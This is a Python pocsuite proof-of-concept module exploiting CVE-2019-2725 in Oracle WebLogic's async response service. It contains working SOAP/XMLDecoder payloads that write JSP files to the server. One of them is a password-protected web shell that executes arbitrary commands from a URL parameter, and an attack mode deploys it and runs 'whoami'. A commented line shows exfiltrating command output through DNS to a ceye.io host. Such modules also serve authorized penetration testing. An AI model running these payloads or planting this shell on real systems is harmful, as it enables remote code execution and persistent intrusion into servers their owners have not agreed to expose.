#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

class TestPOC(POCBase):
    name = 'Weblogic wls9_async_response Command Execution '
    vulID = '0'
    author = ['LRestless']
    vulType = 'cmd-exec'
    version = '1'
    references = ['']
    desc = '''CVE-2019-2725/CNVD-C-2019-48814 Weblogic wls9_async_response'''

    vulDate = '2019-04-17'
    createDate = '2019-05-07'
    updateDate = '2019-04-07'

    appName = 'Weblogic'
    appVersion = '10.*/12.1.3'
    appPowerLink = 'https://www.oracle.com/middleware/technologies/weblogic.html'

    payload1 = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/{0}.jsp</string><void method="println"><string><![CDATA[
    <%
        if("s{1}".equals(request.getParameter("pwd"))){{
            String in = "{2}";
            out.print("<pre>");          
            out.println(in);          
            out.print("</pre>");
        }} 
        %>]]>
    </string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
            '''
    payload2 = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/{0}.jsp</string><void method="println"><string><![CDATA[
    <%
        if("s{0}".equals(request.getParameter("pwd"))){{
            java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
            int a = -1;
            byte[] b = new byte[1024];          
            out.print("<pre>");          
            while((a=in.read(b))!=-1){{
                out.println(new String(b));          
            }}
            out.print("</pre>");
        }} 
        %>]]>
    </string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
            '''

    def verify_result(self, flag, cmd):
        url = self.url + '/bea_wls_internal/{0}.jsp?pwd=s{1}&cmd={2}'.format(flag, flag, cmd)
        print(url)
        try:
            resp = req.get(url, timeout=30)
            retext = re.compile(r'<pre>(.*?)</pre>', re.S)
            if resp.content:
                data = re.findall(retext, resp.content)[0]
                data = re.sub(r'\x00', '', data)
                data = re.sub('\\r\\n\\r\\n', '   ', data)
                return [data, url]
        except Exception:
            pass
        return False

    def _attack(self):
        """attack mode"""
        result = {}
        filename = "/_async/AsyncResponseService"
        url = self.url.strip('/') + filename
        cmd = 'whoami'
        headers = {'content-type': 'text/xml'}
        #--ping `whoami`.weblogic.xxxxxx.ceye.io--
        flag = "".join(random.choice(string.ascii_letters) for _ in xrange(0, 8))
        flag = flag.lower()
        data = self.payload2.format(flag)
        r1 = req.post(url, data=data, headers=headers, timeout=7)
        if r1.status_code == 202:
            datalist = self.verify_result(flag, cmd)
            if datalist:
                result['extra'] = {}
                result['extra']['whoami'] = datalist[0]
                result['VerifyInfo'] = {}
                result['VerifyInfo']['url'] = self.url.strip('/') + filename
                result['ShellInfo'] = {}
                result['ShellInfo']['URL'] = datalist[1]
                result['ShellInfo']['Content'] = data
        return self.parse_output(result)

    def _verify(self):
        """verify  mode"""
        result = {}
        filename = "/_async/AsyncResponseService"
        url = self.url.strip('/') + filename
        print(url)
        headers = {'content-type': 'text/xml'}
        flag = "".join(random.choice(string.ascii_letters) for _ in xrange(0, 8))
        flag = flag.lower()
        data = self.payload1.format(flag, flag, flag)
        print(data)
        r = req.post(url, data=data, headers=headers, timeout=7)
        if r.status_code == 202:
            flag_url = self.url.strip('/') + '/bea_wls_internal/{0}.jsp?pwd=s{1}'.format(flag, flag)
            print(flag_url)
            r2 = req.get(flag_url)
            if flag in r2.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['url'] = self.url.strip('/') + filename
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

